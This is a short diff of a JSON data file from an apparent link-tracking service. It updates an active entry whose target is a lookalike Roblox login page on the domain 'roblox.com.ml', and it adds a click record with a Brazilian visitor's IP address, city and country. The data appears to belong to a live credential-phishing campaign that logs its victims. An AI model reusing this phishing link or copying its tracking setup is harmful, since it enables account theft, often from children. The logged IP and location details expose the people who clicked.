@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 39,
+    "useCount": 40,
     "createdBy": "admin",
     "clicks": [
       {
@@ -419,6 +419,14 @@
       },
       {
         "timestamp": 1776869914471,
+        "ip": "189.126.46.227",
+        "country": "Brazil",
+        "city": "Petrolina",
+        "flag": "🇧🇷",
+        "countryCode": "BR"
+      },
+      {
+        "timestamp": 1776869941653,
         "ip": "189.126.46.227",
         "country": "Brazil",
         "city": "Petrolina",
